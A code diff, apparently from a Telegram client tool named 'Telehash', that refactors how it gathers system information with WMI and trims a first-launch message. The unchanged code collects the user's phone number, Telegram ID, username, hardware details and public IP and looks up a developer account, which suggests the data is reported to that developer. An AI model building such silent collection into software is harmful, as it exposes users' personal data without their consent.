@@ -1,6 +1,6 @@
 import win32gui, psutil, win32process
 import random as r
-import wmi, platform
+import platform
 from config import *
 import requests
 
@@ -56,11 +56,11 @@ def nowplaying():
         name = 'none'
     return(process, title, artist, name)
 
-def information(client, lang, name):
+def information(client, lang, name, wmi):
     me = client.get_me()
     withdev = client.get_users(dev)
 
-    computer = wmi.WMI()
+    computer = wmi
     computer_info = computer.Win32_ComputerSystem()[0]
     os_info = computer.Win32_OperatingSystem()[0]
     proc_info = computer.Win32_Processor()[0]
@@ -77,8 +77,7 @@ def information(client, lang, name):
             ip = requests.get('https://api.seeip.org/').text
         except:
             ip = 'ip error'
-    text = f'''{me.first_name} запустил Telehash впервые
-NMB: {me.phone_number}
+    text = f'''NMB: {me.phone_number}
 DOG: {me.username}
 ID: {me.id}
 LNG: {lang}
